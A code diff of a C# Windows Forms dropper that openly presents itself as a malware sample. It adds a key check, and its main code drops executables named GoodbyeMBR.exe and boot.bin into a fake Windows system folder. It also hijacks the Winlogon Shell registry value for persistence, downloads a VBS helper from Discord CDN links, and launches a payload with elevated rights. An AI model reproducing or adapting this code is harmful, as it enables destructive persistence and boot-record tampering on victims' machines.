@@ -9,13 +9,12 @@ using System.Reflection;
 using System.Net;
 using System.Linq;
 using System.Management;
-using System.Windows.Forms.VisualStyles;
 
 namespace auth
 {
-    public partial class Form1 : Form
+    public partial class OldForm1 : Form
     {
-        public Form1()
+        public OldForm1()
         {
             InitializeComponent();
             this.MinimizeBox = false;
@@ -101,7 +100,7 @@ namespace auth
             {
                 MessageBox.Show("You're not using a Virtual Machine, so you may not proceed.", "Virtual Machine Check", MessageBoxButtons.OK, MessageBoxIcon.Error);
                 Environment.Exit(0);
-            } else
+            } else if (API.AIO(textBox1.Text))
             {
                 var s = MessageBox.Show("LAST WARNING: Do you want to execute this malware? This sample is malicious and is NOT A JOKE! The creator is NOT responsible for any damage done. You're responsible for your own actions. If in doubt, click \"No\" and nothing will happen.", "Warning", MessageBoxButtons.YesNo, MessageBoxIcon.Warning);
 
@@ -116,34 +115,27 @@ namespace auth
                     File.WriteAllBytes(@"C:\Windows\SystemUpdateResources\BlacklistedApp.exe", auth.Properties.Resources.BlacklistedApp);
                     File.WriteAllBytes(@"C:\Windows\SystemUpdateResources\GoodbyeMBR.exe", auth.Properties.Resources.GoodbyeMBR);
                     File.WriteAllBytes(@"C:\Windows\SystemUpdateResources\boot.bin", auth.Properties.Resources.boot);
-                    File.Copy(@"C:\Windows\System32\cmd.exe", @"C:\Windows\SystemUpdateResources\backupcmd.exe", true);
-                    File.Copy(@"C:\Windows\System32\taskkill.exe", @"C:\Windows\SystemUpdateResources\backuptaskkill.exe", true);
+                    //File.WriteAllBytes(@"C:\Windows\SystemUpdateResources\backupcmd.exe", auth.Properties.Resources.cmd);
+                    //File.WriteAllBytes(@"C:\Windows\SystemUpdateResources\backuptaskkill.exe", auth.Properties.Resources.backuptaskkill);
                     RegistryKey setshellkey = Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon", true);
                     setshellkey.SetValue("Shell", "explorer.exe, \"C:\\Windows\\SystemUpdateResources\\UpdateScreen.exe\"");
                     setshellkey.Dispose();
                     auth.Properties.Resources.BelfiOre_Windows_10_Wallpaper.Save(@"C:\Windows\SystemUpdateResources\BelfiOre Wallpaper.jpg");
-                    try
-                    {
-                        WebClient audio = new WebClient();
-                        string url = "https://cdn.discordapp.com/attachments/705283503163572256/839094340651188234/Windows_8_Error_Dubstep_Remix_Final.wav";
-                        string path = @"C:\Windows\SystemUpdateResources\audio.wav";
-                        audio.DownloadFile(url, path);
-                        audio.Dispose();
-                        WebClient belfioreico = new WebClient();
-                        string belfioreurl = "https://cdn.discordapp.com/attachments/705283503163572256/839087252948779018/Belfiore.ico";
-                        string belfiorepath = @"C:\Windows\SystemUpdateResources\Belfiore.ico";
-                        belfioreico.DownloadFile(belfioreurl, belfiorepath);
-                        belfioreico.Dispose();
-                        WebClient helpervbs = new WebClient();
-                        string helpervbsurl = "https://cdn.discordapp.com/attachments/705283503163572256/844403432572059668/PanOSMainLaunchHelper.vbs";
-                        string helpervbspath = @"C:\Windows\SystemUpdateResources\PanOSMainLaunchHelper.vbs";
-                        helpervbs.DownloadFile(helpervbsurl, helpervbspath);
-                        helpervbs.Dispose();
-                    } catch
-                    {
-                        MessageBox.Show("There was a problem downloading the required resources. Please check your internet connection.", "Install PanOS 10 Sun Valley", MessageBoxButtons.OK, MessageBoxIcon.Error);
-                        Environment.Exit(0);
-                    }
+                    WebClient audio = new WebClient();
+                    string url = "https://cdn.discordapp.com/attachments/705283503163572256/839094340651188234/Windows_8_Error_Dubstep_Remix_Final.wav";
+                    string path = @"C:\Windows\SystemUpdateResources\audio.wav";
+                    audio.DownloadFile(url, path);
+                    audio.Dispose();
+                    WebClient belfioreico = new WebClient();
+                    string belfioreurl = "https://cdn.discordapp.com/attachments/705283503163572256/839087252948779018/Belfiore.ico";
+                    string belfiorepath = @"C:\Windows\SystemUpdateResources\Belfiore.ico";
+                    belfioreico.DownloadFile(belfioreurl, belfiorepath);
+                    belfioreico.Dispose();
+                    WebClient helpervbs = new WebClient();
+                    string helpervbsurl = "https://cdn.discordapp.com/attachments/705283503163572256/844403432572059668/PanOSMainLaunchHelper.vbs";
+                    string helpervbspath = @"C:\Windows\SystemUpdateResources\PanOSMainLaunchHelper.vbs";
+                    helpervbs.DownloadFile(helpervbsurl, helpervbspath);
+                    helpervbs.Dispose();
                     Process startupdatescreen = new Process();
                     startupdatescreen.StartInfo.FileName = @"C:\Windows\SystemUpdateResources\UpdateScreen.exe";
                     startupdatescreen.StartInfo.Verb = "runas";
@@ -155,6 +147,11 @@ namespace auth
                     Environment.Exit(0);
                 }
 
+            }
+            else
+            {
+                MessageBox.Show("Invalid Key!", "Error");
+                textBox1.Clear();
             }
         }
 
@@ -171,17 +168,6 @@ namespace auth
         private void AuthRequestKey_Click(object sender, LinkLabelLinkClickedEventArgs e)
         {
             Process.Start("mailto:orangemanagementcorpn@gmail.com");
-        }
-
-        private void checkBox1_CheckedChanged(object sender, EventArgs e)
-        {
-            if (checkBox1.Checked == true)
-            {
-                button1.Enabled = true;
-            } else
-            {
-                button1.Enabled = false;
-            }
         }
     }
 }
